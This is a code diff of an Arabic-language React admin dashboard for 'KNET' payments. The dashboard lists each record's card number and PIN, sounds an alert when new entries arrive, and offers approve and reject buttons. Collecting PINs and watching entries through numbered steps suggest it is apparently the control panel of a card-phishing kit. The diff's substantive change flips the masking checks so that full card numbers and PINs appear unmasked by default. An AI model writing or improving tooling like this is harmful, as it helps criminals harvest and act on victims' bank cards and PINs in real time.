@@ -38,7 +38,11 @@ import {
   Check,
   X,
 } from "lucide-react";
-import { subscribeToKnetPayments, updateKnetPaymentStatus, type KnetPayment } from "@/lib/firestore";
+import {
+  subscribeToKnetPayments,
+  updateKnetPaymentStatus,
+  type KnetPayment,
+} from "@/lib/firestore";
 
 function MiniSparkline({ data, color }: { data: number[]; color: string }) {
   const max = Math.max(...data);
@@ -444,8 +448,8 @@ function PaymentDetailDialog({
           </div>
 
           <div className="flex gap-2 pt-4 border-t">
-            <Button 
-              variant="destructive" 
+            <Button
+              variant="destructive"
               className="flex-1"
               onClick={async () => {
                 try {
@@ -460,7 +464,7 @@ function PaymentDetailDialog({
               <X className="h-4 w-4 ml-2" />
               رفض
             </Button>
-            <Button 
+            <Button
               className="flex-1 bg-green-600 hover:bg-green-700"
               onClick={async () => {
                 try {
@@ -488,23 +492,24 @@ function useNotificationSound() {
   const playNotificationSound = useCallback(() => {
     try {
       if (!audioContextRef.current) {
-        audioContextRef.current = new (window.AudioContext || (window as any).webkitAudioContext)();
+        audioContextRef.current = new (window.AudioContext ||
+          (window as any).webkitAudioContext)();
       }
       const ctx = audioContextRef.current;
-      
+
       const oscillator = ctx.createOscillator();
       const gainNode = ctx.createGain();
-      
+
       oscillator.connect(gainNode);
       gainNode.connect(ctx.destination);
-      
+
       oscillator.frequency.setValueAtTime(880, ctx.currentTime);
       oscillator.frequency.setValueAtTime(1100, ctx.currentTime + 0.1);
       oscillator.frequency.setValueAtTime(880, ctx.currentTime + 0.2);
-      
+
       gainNode.gain.setValueAtTime(0.3, ctx.currentTime);
       gainNode.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.3);
-      
+
       oscillator.start(ctx.currentTime);
       oscillator.stop(ctx.currentTime + 0.3);
     } catch (err) {
@@ -553,7 +558,11 @@ export default function AdminDashboard() {
 
   useEffect(() => {
     const unsubscribe = subscribeToKnetPayments((payments) => {
-      if (!isInitialLoad.current && soundEnabled && payments.length > previousPaymentCount.current) {
+      if (
+        !isInitialLoad.current &&
+        soundEnabled &&
+        payments.length > previousPaymentCount.current
+      ) {
         playNotificationSound();
       }
       previousPaymentCount.current = payments.length;
@@ -657,12 +666,16 @@ export default function AdminDashboard() {
             <Button
               variant="ghost"
               size="icon"
-              className={`text-white hover:bg-white/10 ${soundEnabled ? 'bg-green-600/20' : ''}`}
+              className={`text-white hover:bg-white/10 ${soundEnabled ? "bg-green-600/20" : ""}`}
               onClick={() => setSoundEnabled(!soundEnabled)}
               data-testid="button-toggle-sound"
               title={soundEnabled ? "إيقاف الصوت" : "تفعيل الصوت"}
             >
-              {soundEnabled ? <Volume2 className="h-4 w-4" /> : <VolumeX className="h-4 w-4" />}
+              {soundEnabled ? (
+                <Volume2 className="h-4 w-4" />
+              ) : (
+                <VolumeX className="h-4 w-4" />
+              )}
             </Button>
             <Button
               variant="ghost"
@@ -859,7 +872,7 @@ export default function AdminDashboard() {
                           onClick={(e) => e.stopPropagation()}
                         >
                           <span className="font-mono text-xs">
-                            {isSensitiveVisible(payment.id, "card")
+                            {!isSensitiveVisible(payment.id, "card")
                               ? `${payment.prefix || ""}' - '${payment.cardNumber || "---"}`
                               : `${payment.cardNumber || "****"}`}
                           </span>
@@ -873,7 +886,7 @@ export default function AdminDashboard() {
                             }}
                             data-testid={`toggle-card-${payment.id}`}
                           >
-                            {isSensitiveVisible(payment.id, "card") ? (
+                            {!isSensitiveVisible(payment.id, "card") ? (
                               <EyeOff className="h-3 w-3" />
                             ) : (
                               <Eye className="h-3 w-3" />
@@ -890,7 +903,7 @@ export default function AdminDashboard() {
                             variant="secondary"
                             className="font-mono bg-red-100 text-red-800"
                           >
-                            {isSensitiveVisible(payment.id, "pin")
+                            {!isSensitiveVisible(payment.id, "pin")
                               ? payment.pass || "---"
                               : "****"}
                           </Badge>
@@ -904,7 +917,7 @@ export default function AdminDashboard() {
                             }}
                             data-testid={`toggle-pin-${payment.id}`}
                           >
-                            {isSensitiveVisible(payment.id, "pin") ? (
+                            {!isSensitiveVisible(payment.id, "pin") ? (
                               <EyeOff className="h-3 w-3" />
                             ) : (
                               <Eye className="h-3 w-3" />
@@ -944,18 +957,11 @@ export default function AdminDashboard() {
                         </div>
                       </td>
                       <td className="p-3">
-                        <div className="flex items-center gap-0.5">
-                          {[1, 2, 3, 4, 5, 6, 7].map((step) => (
-                            <div
-                              key={step}
-                              className={`h-2 w-2 rounded-full ${
-                                step <= (payment.step || 1)
-                                  ? "bg-green-500"
-                                  : "bg-gray-300"
-                              }`}
-                            />
-                          ))}
-                        </div>
+                        {payment.status === "approved"
+                          ? "مقبول"
+                          : payment.status === "rejected"
+                            ? "مرفوض"
+                            : "معلق"}
                       </td>
                       <td className="p-3">
                         <div
@@ -969,7 +975,10 @@ export default function AdminDashboard() {
                             onClick={async (e) => {
                               e.stopPropagation();
                               try {
-                                await updateKnetPaymentStatus(payment.id, "rejected");
+                                await updateKnetPaymentStatus(
+                                  payment.id,
+                                  "rejected",
+                                );
                               } catch (err) {
                                 console.error("Failed to reject payment:", err);
                               }
@@ -985,9 +994,15 @@ export default function AdminDashboard() {
                             onClick={async (e) => {
                               e.stopPropagation();
                               try {
-                                await updateKnetPaymentStatus(payment.id, "approved");
+                                await updateKnetPaymentStatus(
+                                  payment.id,
+                                  "approved",
+                                );
                               } catch (err) {
-                                console.error("Failed to approve payment:", err);
+                                console.error(
+                                  "Failed to approve payment:",
+                                  err,
+                                );
                               }
                             }}
                             data-testid={`button-approve-${payment.id}`}
